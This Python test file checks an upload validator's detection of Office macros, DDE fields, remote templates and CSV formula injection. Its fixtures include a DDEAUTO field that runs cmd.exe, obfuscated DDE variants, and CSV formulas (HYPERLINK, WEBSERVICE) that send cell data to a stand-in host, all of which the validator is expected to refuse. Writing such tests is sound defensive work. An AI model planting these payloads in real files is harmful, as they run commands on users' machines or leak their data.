"""OfficeMacros: macros, DDE and remote templates in OOXML, ODF and OLE2."""

from __future__ import annotations

import csv
import io
import random
import re

import pytest

from tests.support import corpus
from tests.support.engine import codes
from uploadshield import Policy, Upload, presets, validate
from uploadshield.checks import (
    OfficeMacros,
)

OOXML = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"


def test_office_documents() -> None:
    assert codes(corpus.ooxml("docx"), "a.docx") == ()
    assert codes(corpus.ooxml("xlsx"), "a.xlsx") == ()
    assert codes(corpus.odt(), "a.odt") == ()
    assert codes(corpus.docx_with_external_hyperlink(), "a.docx") == ()


def test_macro_documents_are_refused() -> None:
    # A real macro-enabled document is a different (disallowed) type, whatever its name.
    assert codes(corpus.ooxml("docm"), "a.docx") == ("type_not_allowed",)
    # Macros smuggled into a document that claims to be a plain .docx.
    smuggled = corpus.ooxml("docx", extra={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0"})
    assert codes(smuggled, "a.docx") == ("office_macros",)
    assert codes(corpus.odt(extra={"Basic/Standard/Module1.xml": b"<x/>"}), "a.odt") == (
        "office_macros",
    )
    assert codes(corpus.docx_with_dde(), "a.docx") == ("office_macros",)
    assert codes(corpus.docx_with_remote_template(), "a.docx") == ("office_external_reference",)
    allow_remote = presets.DOCUMENTS.replace(
        content_checks=(OfficeMacros(block_external_references=False),)
    )
    assert codes(corpus.docx_with_remote_template(), "a.docx", allow_remote) == ()


def test_legacy_ole_documents() -> None:
    ole_policy = Policy(allowed_types={"application/x-ole-storage"})
    assert codes(corpus.ole(), "a.doc", ole_policy) == ()
    assert codes(corpus.ole(macros=True), "a.xls", ole_policy) == ("office_macros",)
    assert codes(corpus.ole(), "a.msi", ole_policy) == ("filename_dangerous_extension",)


DDE = (
    b'<w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" '
    b"</w:instrText></w:r>"
)


@pytest.mark.parametrize(
    "part", ["word/header1.xml", "word/footer2.xml", "word/footnotes.xml", "word/comments.xml"]
)
def test_dde_fields_in_any_word_part_are_refused(part: str) -> None:
    document = corpus.ooxml("docx", extra={part: b"<w:hdr><w:p>" + DDE + b"</w:p></w:hdr>"})
    assert codes(document, "a.docx") == ("office_macros",)


def test_dde_fields_in_parts_larger_than_the_read_limit_are_refused() -> None:
    padding = b"<w:p>" + b"x" * 50_000 + b"</w:p>"
    document = corpus.ooxml("docx", document=b"<w:document>" + padding + DDE + b"</w:document>")
    small = presets.DOCUMENTS.replace(content_checks=(OfficeMacros(max_part_bytes=1024),))
    assert codes(document, "a.docx", small) == ("office_macros",)


def test_relationship_parts_too_large_to_read_are_refused() -> None:
    rels = b"<Relationships>" + b" " * 5000 + b"</Relationships>"
    document = corpus.ooxml("docx", extra={"word/_rels/document.xml.rels": rels})
    small = presets.DOCUMENTS.replace(content_checks=(OfficeMacros(max_part_bytes=1024),))
    assert codes(document, "a.docx", small) == ("check_failed",)


# --------------------------------------------------------------------------- #
# Security review, 2026-11-14: parts are read the way Office reads them
# --------------------------------------------------------------------------- #

TEMPLATE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
ONLY_OFFICE = presets.DOCUMENTS.replace(content_checks=(OfficeMacros(),))


def refusal(document: bytes, name: str = "a.docx", policy: Policy = ONLY_OFFICE) -> object:
    """``(code, reason or parts)`` of the refusal; ``None`` for an accepted file."""
    result = validate(Upload.from_bytes(document, name), policy)
    if result.ok:
        return None
    (violation,) = result.violations
    details = violation.details
    return str(violation.code), details.get("reason") or details.get("parts")


def with_relationships(xml: str | bytes, part: str = "word/_rels/settings.xml.rels") -> bytes:
    return corpus.ooxml("docx", extra={part: xml if isinstance(xml, bytes) else xml.encode()})


REMOTE = "http://e.example/t"


@pytest.mark.parametrize(
    "relationship",
    [
        f"<Relationship Id='r1' Type='{TEMPLATE}' Target='{REMOTE}' TargetMode='External'/>",
        f'<Relationship Id="r1" Type = "{TEMPLATE}" Target="{REMOTE}" TargetMode = "External"/>',
        f'<Relationship\n Id="r1"\n Type="{TEMPLATE}"\n Target="t"\n TargetMode="External"\n/>',
        f'<Relationship Id="r1" Type="{TEMPLATE}" Target="{REMOTE}" TargetMode="Exter&#110;al"/>',
        f'<Relationship Id="r1" Type="{TEMPLATE.replace("attachedT", "attached&#x54;")}"'
        f' Target="{REMOTE}" TargetMode="External"/>',
        f'<Relationship Id="r1" Target="{REMOTE}/a>b" Type="{TEMPLATE}" TargetMode="External"/>',
        f'<Relationship Id="r1" Type="{TEMPLATE}" Target="{REMOTE}" TargetMode=" external "/>',
        f'<p:Relationship xmlns:p="p" Id="r1" Type="{TEMPLATE}" Target="t" TargetMode="External"/>',
    ],
)
def test_remote_templates_are_found_however_the_relationship_is_written(relationship: str) -> None:
    document = with_relationships(f"<Relationships>{relationship}</Relationships>")
    assert codes(document, "a.docx") == ("office_external_reference",)


@pytest.mark.parametrize("encoding", ["utf-16", "utf-16-le", "utf-16-be", "utf-8-sig"])
def test_remote_templates_are_found_in_any_encoding_office_reads(encoding: str) -> None:
    declared = "UTF-8" if encoding == "utf-8-sig" else "UTF-16"
    xml = (
        f'<?xml version="1.0" encoding="{declared}"?><Relationships><Relationship Id="r1" '
        f'Type="{TEMPLATE}" Target="http://e.example/t" TargetMode="External"/></Relationships>'
    )
    assert codes(with_relationships(xml.encode(encoding)), "a.docx") == (
        "office_external_reference",
    )


def test_internal_and_harmless_relationships_pass() -> None:
    internal = (
        f'<Relationships><Relationship Id="r1" Type="{TEMPLATE}" Target="t.dotx"/></Relationships>'
    )
    assert codes(with_relationships(internal), "a.docx") == ()
    image = TEMPLATE.replace("attachedTemplate", "image")
    linked = (
        f'<Relationships><Relationship Id="r1" Type="{image}" Target="https://e.example/a.png" '
        'TargetMode="External"/></Relationships>'
    )
    assert codes(with_relationships(linked), "a.docx") == ()
    # A relationship element in a part that is not a relationships part means nothing.
    stray = corpus.ooxml(
        "docx",
        extra={
            "customXml/item1.xml": internal.replace("t.dotx", "t")
            .replace("/>", ' TargetMode="External"/>')
            .encode()
        },
    )
    assert codes(stray, "a.docx") == ()


def test_macro_parts_are_found_by_their_relationship_whatever_they_are_called() -> None:
    vba = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    rels = f'<Relationships><Relationship Id="r1" Type="{vba}" Target="data.bin"/></Relationships>'
    document = corpus.ooxml(
        "docx", extra={"word/_rels/document.xml.rels": rels.encode(), "word/data.bin": b"\xd0\xcf"}
    )
    assert refusal(document) == ("office_macros", ["word/_rels/document.xml.rels"])


def field(*runs: str, simple: str | None = None) -> bytes:
    """A document with one field whose instruction is spread over ``runs``."""
    if simple is not None:
        body = f"<w:p><w:fldSimple w:instr={simple}><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>"
    else:
        body = '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        body += "".join(f"<w:r><w:instrText>{run}</w:instrText></w:r>" for run in runs)
        body += '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r>'
        body += '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    return f"<w:document><w:body>{body}</w:body></w:document>".encode()


DDE_FIELDS = [
    field(' DDEAUTO a "b" '),
    field(" DD", "EAUTO a b "),  # one instruction, spread over two runs
    field(" D", "D", "E", " a b "),
    field(" &#68;DEAUTO a b "),  # a character reference
    field(" &#x44;&#x44;&#x45; a b "),
    field(" <![CDATA[DDEAUTO]]> a b "),
    field(" DD<!-- c -->EAUTO a b "),
    field(' "DDEAUTO" a b '),
    field(" ddeauto a b "),
    field(simple='"DDEAUTO a b"'),
    field(simple="'DDEAUTO a b'"),  # single quotes
    field(simple='"&#68;DE a b"'),
    # A field nested in the instruction of another one: each is judged by its own text.
    field(' DDEAUTO </w:instrText></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
          '<w:r><w:instrText> QUOTE 1 </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/>'
          "</w:r><w:r><w:instrText> b "),
    field(' IF 1 </w:instrText></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
          '<w:r><w:instrText> DDE a b </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/>'
          "</w:r><w:r><w:instrText> 2 "),
    b"<w:document><w:body><w:p><w:r><w:delInstrText> DDEAUTO a b </w:delInstrText></w:r>"
    b"</w:p></w:body></w:document>",
    # A field that is opened and never closed.
    b'<w:document><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
    b"<w:r><w:instrText> DDEAUTO a b </w:instrText></w:r></w:p></w:body></w:document>",
]  # fmt: skip


@pytest.mark.parametrize("document", DDE_FIELDS)
def test_dde_fields_are_found_however_they_are_written(document: bytes) -> None:
    assert refusal(corpus.ooxml("docx", document=document)) == (
        "office_macros",
        ["word/document.xml"],
    )


@pytest.mark.parametrize("encoding", ["utf-16", "utf-16-le", "utf-16-be"])
def test_dde_fields_are_found_in_utf16_parts(encoding: str) -> None:
    xml = '<?xml version="1.0" encoding="UTF-16"?>' + DDE_FIELDS[0].decode()
    document = corpus.ooxml("docx", document=xml.encode(encoding))
    assert refusal(document) == ("office_macros", ["word/document.xml"])


@pytest.mark.parametrize("part", ["content/doc.xml", "word/document.dat", "d", "word/x.bin"])
def test_dde_is_found_in_a_part_of_any_name(part: str) -> None:
    # The main document is the part the package relationship points at, wherever it is.
    assert refusal(corpus.ooxml("docx", extra={part: DDE_FIELDS[0]})) == ("office_macros", [part])
    sheet = b"<worksheet><sheetData><row><c><f>app|topic!item</f></c></row></sheetData></worksheet>"
    assert refusal(corpus.ooxml("xlsx", extra={part: sheet}), "a.xlsx") == ("office_macros", [part])
    link = b'<externalLink><ddeLink ddeService="app" ddeTopic="topic"/></externalLink>'
    assert refusal(corpus.ooxml("xlsx", extra={part: link}), "a.xlsx") == ("office_macros", [part])


def test_every_entry_of_a_repeated_name_is_read() -> None:
    import zipfile

    with zipfile.ZipFile(io.BytesIO(corpus.ooxml("docx"))) as zf:
        base = [(name, zf.read(name)) for name in zf.namelist() if name != "word/document.xml"]
    clean = b"<w:document><w:body><w:p>Hi</w:p></w:body></w:document>"
    for pair in ([DDE_FIELDS[0], clean], [clean, DDE_FIELDS[0]]):
        entries = base + [("word/document.xml", data) for data in pair]
        document = corpus.build_zip_with_repeated_names(entries)
        assert refusal(document) == ("office_macros", ["word/document.xml"])


@pytest.mark.parametrize(
    "document",
    [
        field(" PAGE "),
        field(' HYPERLINK "https://example.com" '),
        field(" TOC \\o "),
        field(" DDEX a b "),  # no field of that name
        field(" ADDE a b "),
        field(simple='"DATE"'),
        b"<w:document><w:body><w:p><w:r><w:t> DDEAUTO is a field code </w:t></w:r></w:p>"
        b"</w:body></w:document>",
        b"<w:document><w:body><w:p><!-- <w:instrText> DDEAUTO a b </w:instrText> -->"
        b"</w:p></w:body></w:document>",
        # A formula with a pipe and no "!", a math fraction, a VML formula: no DDE.
        b"<worksheet><sheetData><row><c><f>A1|B1</f></c><c><f>Sheet2!A1</f></c></row>"
        b"</sheetData></worksheet>",
        b"<m:f><m:num><m:r><m:t>|x|!</m:t></m:r></m:num></m:f>",
        b'<v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/></v:formulas>',
    ],
)
def test_ordinary_fields_and_formulas_pass(document: bytes) -> None:
    assert refusal(corpus.ooxml("docx", document=document)) is None
    assert codes(corpus.ooxml("docx", document=document), "a.docx") == ()


@pytest.mark.parametrize(
    "part",
    [
        b'<?xml version="1.0" encoding="UTF-7"?><w:document/>',
        b'<?xml version="1.0" encoding="ISO-2022-JP"?><w:document/>',
        b'<?xml version="1.0" encoding="Shift_JIS"?><w:document/>',
        b'<?xml version="1.0" encoding="UTF-16"?><w:document/>',  # declared, but not UTF-16
        '<?xml version="1.0" encoding="IBM037"?><w:document/>'.encode("cp037"),
        '<?xml version="1.0"?><w:document/>'.encode("utf-32"),
        b'<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY d "DDEAUTO">]><w:document/>',
        b"<!DOCTYPE w:document><w:document/>",
    ],
)
def test_parts_that_office_may_read_differently_are_refused(part: bytes) -> None:
    # With the default checks XmlSafety refuses most of these first; alone, OfficeMacros
    # must not read "cannot tell" as "nothing found".
    for name in ("word/document.xml", "word/other.dat"):
        document = corpus.ooxml("docx", extra={name: part})
        assert refusal(document) == ("office_macros", "uncheckable"), name
    assert codes(corpus.ooxml("docx", extra={"word/other.dat": part}), "a.docx") != ()


def test_parts_that_are_not_well_formed_do_not_stop_the_check() -> None:
    # No XML parser reads past the error, so Office does not load such a part; what
    # comes before the error is still judged, and so are the other parts.
    broken = b"<w:document><w:body><w:p></w:body></w:document>"
    assert refusal(corpus.ooxml("docx", extra={"word/header1.xml": broken})) is None
    late = DDE_FIELDS[0].replace(b"</w:body>", b"</w:oops>")
    assert refusal(corpus.ooxml("docx", document=late)) == ("office_macros", ["word/document.xml"])
    both = corpus.ooxml("docx", document=DDE_FIELDS[0], extra={"word/a.xml": broken})
    assert refusal(both) == ("office_macros", ["word/document.xml"])
    binary = corpus.ooxml("docx", extra={"word/media/image1.png": corpus.png()})
    assert refusal(binary) is None


UNCHECKABLE = ("office_macros", "uncheckable")
FIELD = "<w:instrText> PAGE </w:instrText>"  # makes a part worth parsing


def part_with(body: str, *, field: str = FIELD) -> bytes:
    return corpus.ooxml("docx", document=f"<w:document>{field}{body}</w:document>".encode())


def test_parts_with_nothing_to_find_are_not_parsed() -> None:
    # An XML parser reports every element to Python: 3 million of them would take
    # seconds.  A part without a field, a DDE link or a "|" cannot hold anything this
    # check refuses, and a search of its bytes shows that much faster.
    import time

    documents = [part_with(body * 1_000_000, field="") for body in ("<w:a/>", "<w:a>")]
    started = time.perf_counter()
    for document in documents:
        assert refusal(document) is None
    assert time.perf_counter() - started < 1


def test_a_long_run_of_blanks_before_an_instruction_hides_nothing() -> None:
    blanks = "<w:instrText>" + " " * 3_000_000 + "DDEAUTO a b</w:instrText>"
    assert refusal(part_with(blanks, field="")) == ("office_macros", ["word/document.xml"])
    text = "<w:t>" + "x" * 3_000_000 + "</w:t>"  # text is read as it arrives, at any length
    assert refusal(part_with(text)) is None


def test_nesting_is_bounded() -> None:
    # The parser keeps state for every open element: 10 million of them took 1.8 GB.
    import time

    assert refusal(part_with("<w:a>" * 900 + "</w:a>" * 900)) is None
    assert refusal(part_with("<w:a>" * 1_001 + "</w:a>" * 1_001)) == UNCHECKABLE
    hidden = "<w:a>" * 2_000 + "<w:instrText> DDEAUTO a b </w:instrText>"
    assert refusal(part_with(hidden, field="")) == UNCHECKABLE
    deep = part_with("<w:a>" * 3_000_000)
    started = time.perf_counter()
    assert refusal(deep) == UNCHECKABLE
    assert time.perf_counter() - started < 1


@pytest.mark.parametrize(
    "markup",
    ["<!--{}-->", '<w:a b="{}"/>', "<?p {}?>", "<w:a{}/>", "<w:a " + "{}" + "/>"],
)
def test_one_piece_of_markup_is_bounded(markup: str) -> None:
    # A tag, a comment or a processing instruction is kept by the parser until it is
    # complete (and read again from its start with every piece by older versions).
    assert refusal(part_with(markup.replace("{}", "x" * 3_000_000))) == UNCHECKABLE
    if "a " not in markup:
        assert refusal(part_with(markup.replace("{}", "x" * 300_000))) is None
    many = " ".join(f'a{i}="1"' for i in range(300_000))
    assert refusal(part_with(f"<w:a {many}/>")) == UNCHECKABLE


def test_the_number_of_elements_is_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
    from uploadshield.checks import office

    monkeypatch.setattr(office, "_MAX_ELEMENTS", 1_000)
    assert refusal(part_with("<w:a/>" * 900)) is None
    assert refusal(part_with("<w:a/>" * 1_100)) == UNCHECKABLE
    # ... across all the parts that have to be parsed, together,
    body = f"<w:document>{FIELD}{'<w:a/>' * 600}</w:document>".encode()
    two = corpus.ooxml("docx", document=body, extra={"word/header1.xml": body})
    assert refusal(two) == UNCHECKABLE
    # ... not counting the ones that are only searched,
    plain = f"<w:document>{'<w:a/>' * 5_000}</w:document>".encode()
    assert refusal(corpus.ooxml("docx", extra={"word/header1.xml": plain})) is None
    # ... and a field that comes within the limit is still found.
    found = part_with("<w:instrText> DDEAUTO a b </w:instrText>" + "<w:a/>" * 5_000, field="")
    assert refusal(found) == ("office_macros", ["word/document.xml"])


def test_the_limit_on_elements_allows_large_documents() -> None:
    import time

    large = part_with("<w:p><w:r><w:t>text</w:t></w:r></w:p>" * 300_000)  # 900,000 elements
    started = time.perf_counter()
    assert refusal(large) is None
    assert time.perf_counter() - started < 3


@pytest.mark.parametrize(
    "trigger",
    ["&#124;", "&#x7C;", "&#x7c;", "&#0124;", "&#x007c;", "&#00000124;", "|", "<![CDATA[|]]>"],
)
def test_a_formula_is_found_however_its_pipe_is_written(trigger: str) -> None:
    # Parts are only parsed when they hold something that could matter; for a DDE
    # formula that is its "|", which may be a character reference.
    sheet = f"<worksheet><sheetData><row><c><f>app{trigger}topic!item</f></c></row></sheetData>"
    document = corpus.ooxml(
        "xlsx", extra={"xl/worksheets/sheet1.xml": f"{sheet}</worksheet>".encode()}
    )
    assert refusal(document, "a.xlsx") == ("office_macros", ["xl/worksheets/sheet1.xml"])


FIELD_CODES = [
    " DDEAUTO a b ",
    " DDE a b ",
    "DDEAUTO",
    ' "DDEAUTO" x',
    " PAGE ",
    " DDEX a ",
    " TOC ",
]
FORMULA_TEXTS = ["app|topic!item", "A1|B1", "Sheet2!A1", "SUM(A1:A9)", "a|b", "x!y|z", "1+1"]
FILLERS = ["<{n}>text</{n}>", "<{n}/>", "<{n}>x | y</{n}>", "<{n}>DDEAUTO is a field</{n}>"]


def rewritten(text: str, rng: random.Random) -> str:
    """``text`` as an XML parser reads it, written with references, CDATA and comments."""
    out = []
    for char in text:
        kind = rng.random()
        if char in "<&":
            out.append({"<": "&lt;", "&": "&amp;"}[char])
        elif kind < 0.1:
            out.append(f"&#{'0' * rng.randint(0, 3)}{ord(char)};")
        elif kind < 0.2:
            out.append(f"&#x{'0' * rng.randint(0, 3)}{ord(char):x};")
        elif kind < 0.25:
            out.append(f"<![CDATA[{char}]]>")
        elif kind < 0.3:
            out.append(char + rng.choice(["<!-- c -->", "<?pi x?>"]))
        else:
            out.append(char)
    return "".join(out)


def random_part(rng: random.Random) -> bytes:
    def name(local: str) -> str:
        local = rng.choice([local, local, local.upper(), local.lower()])
        prefix = rng.choice(["w", "w", "", "x.y", "_"])
        return f"{prefix}:{local}" if prefix else local

    def element() -> str:
        kind = rng.random()
        if kind < 0.25:
            tag, code = name(rng.choice(["instrText", "delInstrText"])), rng.choice(FIELD_CODES)
            pieces = [code] if rng.random() < 0.6 else [code[:3], code[3:]]
            return "".join(f"<{tag}>{rewritten(piece, rng)}</{tag}>" for piece in pieces)
        if kind < 0.35:
            mark = rng.choice(["begin", "separate", "end"])
            return f"<{name('fldChar')} w:fldCharType='{mark}'/>"
        if kind < 0.42:
            code = rng.choice(FIELD_CODES).replace('"', "&quot;")
            return f'<{name("fldSimple")} w:instr="{code}"/>'
        if kind < 0.46:
            return f"<{name('ddeLink')} ddeService='app'/>"
        if kind < 0.65:
            tag = name(rng.choice(["f", "definedName"]))
            return f"<{tag}>{rewritten(rng.choice(FORMULA_TEXTS), rng)}</{tag}>"
        return rng.choice(FILLERS).format(n=name(rng.choice(["p", "t", "c", "fx", "instr"])))

    risky = rng.random() < 0.5
    body = "".join(
        element() if risky or rng.random() < 0.15 else rng.choice(FILLERS).format(n=name("t"))
        for _ in range(rng.randint(1, 8))
    )
    encoding = rng.choice(["utf-8", "utf-8", "utf-8-sig", "utf-16", "utf-16-le", "utf-16-be"])
    declared = "UTF-8" if encoding.startswith("utf-8") else "UTF-16"
    return f'<?xml version="1.0" encoding="{declared}"?><w:document>{body}</w:document>'.encode(
        encoding
    )


def test_parts_are_skipped_only_when_parsing_them_would_find_nothing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # A part is parsed only if a search of its bytes finds something that could matter.
    # That search must never change a verdict: random parts, with fields, DDE links and
    # formulas written in every way XML allows, are judged with it and with every part
    # parsed - and the two must agree.
    from uploadshield.checks import office

    rng = random.Random(20261114)
    names = ["word/document.xml", "word/header1.xml", "xl/worksheets/sheet1.xml", "content/x.dat"]
    documents = [
        corpus.ooxml("docx", extra={name: random_part(rng) for name in rng.sample(names, 2)})
        for _ in range(1500)
    ]
    searched = [refusal(document) for document in documents]
    monkeypatch.setattr(office, "_may_matter", lambda pieces, encoding: True)
    parsed = [refusal(document) for document in documents]
    assert searched == parsed
    assert sum(verdict is not None for verdict in parsed) > 500  # enough of them matter


def test_a_declaration_that_contradicts_the_bytes_is_refused() -> None:
    # Parsers disagree on which one wins, so what follows could be read either way.
    hidden = b'<?xml version="1.0" encoding="UTF-16LE"?>' + DDE_FIELDS[0].decode().encode(
        "utf-16-le"
    )
    assert refusal(corpus.ooxml("docx", extra={"word/header1.xml": hidden})) == UNCHECKABLE
    reverse = ('<?xml version="1.0" encoding="UTF-8"?>' + DDE_FIELDS[0].decode()).encode("utf-16")
    assert refusal(corpus.ooxml("docx", extra={"word/header1.xml": reverse})) == UNCHECKABLE


# --------------------------------------------------------------------------- #
# CSV
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "csv",
    [
        b"a,b\n=app|topic!item,1\n",
        b"=app|topic!item\n",  # the very first cell
        b"a,b\n\"=app|'x, y'!item\",1\n",  # a delimiter inside a quoted cell
        b"a,b\n\"=app|'x; y'!item\";1\n",
        b"a;b\n=app|'x, y'!item;1\n",  # bare, where ";" delimits and "," is data
        b"sep=\t\na\tb\n=app|'x, y; z'!item\t1\n",
        b"a,b\n\"=app|'x\ny'!item\",1\n",  # a line break inside a quoted cell
        b'a,b\n"=app|\'say ""hi"", you\'!item",1\n',  # an escaped quote
        b'a,b\n  "  =app|topic!item",1\n',
        b"a\tb\n+app|topic!item\t1\n",
        b"a;b\n-app|topic!item;1\n",
        b"a,b\n@app|topic!item,1\n",
        b'a,b\n"=app|topic!item\n',  # the closing quote is missing
        "a,b\n=app|topic!item,1\n".encode("utf-16"),  # spreadsheets open UTF-16 too
        "a,b\n=app|topic!item,1\n".encode("utf-16-be").join([b"\xfe\xff", b""]),
    ],
)
def test_dde_cells_are_refused(csv: bytes) -> None:
    assert refusal(csv, "a.csv") == ("office_macros", None)


def test_a_dde_cell_cut_by_a_chunk_boundary_is_found() -> None:
    # Cells are scanned in windows of 1 MiB; a long one must not fall between two.
    for padding in (10, 5_000, 60_000):
        cell = b"\"=app|'" + b" " * padding + b"'!item\""
        for lead in (1024 * 1024 - padding // 2, 1024 * 1024 - 3, 2 * 1024 * 1024 - 20):
            csv = b"a,b\n" + b"x" * (lead - 4) + b"\n" + cell + b",1\n"
            assert refusal(csv, "a.csv") == ("office_macros", None), (padding, lead)


@pytest.mark.parametrize(
    "csv",
    [
        b'a,b\n=HYPERLINK("http://e.example/?"&A1,"x"),1\n',
        b'a,b\n=hyperlink ("http://e.example","x"),1\n',
        b'a,b\n"=HYPERLINK(""http://e.example"", ""x"")",1\n',
        b'a,b\n"=IF(A1,WEBSERVICE(""http://e.example/""&A1),0)",1\n',
        b'a;b\n=IF(A1,WEBSERVICE("http://e.example/"&A1),0);1\n',  # ";" delimits here
        b'a,b\n=1+IMPORTXML("http://e.example","//a"),1\n',
        b'a,b\n=IMPORTDATA("http://e.example")\n',
        b'a,b\n+HYPERLINK("http://e.example","x"),1\n',
        b'a,b\n-1+WEBSERVICE("http://e.example"),1\n',
        b'a,b\n@FILTERXML(WEBSERVICE("http://e.example"),"//a"),1\n',
        b'a,b\n=DDE("app";"topic";"item"),1\n',
        b'a,b\n=RTD("a.b",,"c"),1\n',
    ],
)
def test_formulas_that_fetch_or_send_data_are_refused(csv: bytes) -> None:
    assert refusal(csv, "a.csv") == ("office_macros", "data_formula")
    lenient = presets.DOCUMENTS.replace(content_checks=(OfficeMacros(block_data_formulas=False),))
    assert refusal(csv, "a.csv", lenient) is None


@pytest.mark.parametrize(
    "csv",
    [
        b"item,price\napple,-5\npear,+3\n",
        b"who,what\n@alice,- see the hyperlink (below)\n",
        b"a,b\n=1+1,=SUM(A1:A2)\n",
        b"a,b\nplain,the hyperlink(s) and webservice(s) we use\n",
        b"a,b\n=myhyperlink(1),=x.hyperlink(2)\n",
        b'a,b\n"a|b","c!d"\n',
        b"a,b\na|b!c,x = y | z!\n",  # a pipe and a bang, but no formula
        b"n,note\n-5,fine | really!\n+3,a|b!\n",  # a number, then text with both
        b'a,b\n"He said ""=app|topic!item"" twice",1\n',  # quoted text, not a cell start
        b"a|b|c\n1|2|3!\n",
    ],
)
def test_ordinary_csv_passes(csv: bytes) -> None:
    assert refusal(csv, "a.csv") is None
    assert codes(csv, "a.csv", presets.DOCUMENTS) == ()


@pytest.mark.parametrize(
    "csv",
    [
        # Only the first formula cell of a bare row is tried against the rest of the row
        # (anything else would be quadratic), so it must really be the first one: a later
        # cell that merely looks like one must not be picked instead (found by comparing
        # the rules with the csv module on random files, 2026-11-14).
        b"a,b\n=app|topic!item,+a|b\n",
        b"a,b\n=app|topic!item,=x|y,-a|b\n",
        b"a;b\nx;=app|topic!item;=x|\n",
        b'a,b\n=1+HYPERLINK("http://e.example"),=1+1\n',
        b"a\tb\n= WEBSERVICE(A1)\t@home\t=1+1\n",
        b'a,b\n=1+1,=SUM(A1),=HYPERLINK("http://e.example")\n',
    ],
)
def test_the_first_formula_cell_of_a_row_is_the_one_that_counts(csv: bytes) -> None:
    assert refusal(csv, "a.csv") is not None


CSV_PLAIN = [
    "alice", "10", "-5", "+3.5", "@home", "a|b", "wow!", "a,b", "x;y", "tab\there", 'say "hi"',
    "line\nbreak", "", " ", "=1+1", "=SUM(A1:A2)", "-", "+", "a=b|c!d", "see hyperlink(x)",
    "- see the hyperlink (below)", "x | y !", "=A1&B1", "+a|b", "=x|y", "-a|b c", "@a|", "=x|",
    "=hyperlinks", "=a.hyperlink(1)",
]  # fmt: skip
CSV_TOPICS = [
    "topic",
    "'x y'",
    "'x, y'",
    "'x; y'",
    "'a\tb'",
    "'say \"hi\"'",
    "'two\nlines'",
    "a,b;c",
]
CSV_FUNCTIONS = [
    "HYPERLINK",
    "hyperlink",
    "WEBSERVICE",
    "IMPORTXML",
    "ImportData",
    "FILTERXML",
    "RTD",
]
CSV_CALL = (
    r"(?<![a-z0-9_.])(?:hyperlink|webservice|filterxml|rtd|dde|import(?:xml|data|html|feed|range))"
)
CSV_DANGEROUS = re.compile(
    r"[ \t]*(?:[=+\-@][^|]*\|.*!|=.*?" + CSV_CALL + r"[ \t]*\(|[+\-@].*?" + CSV_CALL + r"\()",
    re.DOTALL | re.IGNORECASE,
)


def random_csv(rng: random.Random) -> tuple[bytes, bool]:
    """A CSV file as a spreadsheet would write it, and whether one of its cells is a
    DDE reference or a formula that fetches data."""
    delimiter = rng.choice([",", ";", "\t"])
    risky = rng.random() < 0.4
    rows = []
    for _ in range(rng.randint(1, 6)):
        row = [rng.choice(CSV_PLAIN) for _ in range(rng.randint(1, 5))]
        if risky and rng.random() < 0.3:
            lead = rng.choice(["=", "+", "-", "@", " =", "=1+", "@SUM("])
            call = f"{rng.choice(CSV_FUNCTIONS)}{rng.choice(['', ' '])}(A1)"
            row[rng.randrange(len(row))] = rng.choice(
                [
                    f"{lead}app|{rng.choice(CSV_TOPICS)}!{rng.choice(['A0', 'item', ''])}",
                    f"={rng.choice(['', '1+', 'IF(A1,', ' '])}{call}",
                    f"{rng.choice('+-@')}{rng.choice(['', '1+'])}{call.replace(' (', '(')}",
                ]
            )
        rows.append(row)
    buffer = io.StringIO()
    csv.writer(buffer, delimiter=delimiter, lineterminator=rng.choice(["\n", "\r\n"])).writerows(
        rows
    )
    written = buffer.getvalue()
    cells = [cell for row in csv.reader(io.StringIO(written), delimiter=delimiter) for cell in row]
    encoded = written.encode("utf-16" if rng.random() < 0.1 else "utf-8")
    return encoded, any(CSV_DANGEROUS.match(cell) for cell in cells)


def test_the_csv_rules_miss_no_cell_a_spreadsheet_would_evaluate() -> None:
    # Files written by the csv module in random dialects, which quotes cells exactly
    # when the dialect needs it: whichever delimiter is in use, a DDE cell or a data
    # formula in any cell is refused.  (The rules are more liberal than a spreadsheet
    # about what follows on a bare row, so only this direction is asserted.)
    rng = random.Random(20261114)
    dangerous = 0
    for _ in range(4000):
        data, expected = random_csv(rng)
        if expected:
            dangerous += 1
            assert refusal(data, "a.csv") is not None, data
    assert dangerous > 800


@pytest.mark.parametrize(
    "csv",
    [
        b"x\n=" + b"a|" * 20_000 + b"\n",
        b"x\n" + b"=cmd" * 20_000 + b"\n",
        b"x\n" + b"|" * 50_000 + b"\n",
        # Quoted cells, escaped quotes and formula starts without an end (2026-11-14).
        b'x\n"=a|' + b'""' * 500_000,
        b"x\n" + b',"=a|' * 200_000,
        b"x\n" + b',"=a|""' * 150_000,
        b'x\n"=' + b"a" * 1_000_000,
        b"x\n=" + b"hyperlink" * 100_000,
        b"x\n" + b",=hyperlink" * 100_000,
        b'x\n"=' + b'hyperlink""' * 100_000,
        b"x\n" + b",+" * 500_000,
    ],
)
def test_csv_formula_scanning_is_linear(csv: bytes) -> None:
    import time

    started = time.perf_counter()
    codes(csv, "a.csv", presets.DOCUMENTS)
    assert time.perf_counter() - started < 2
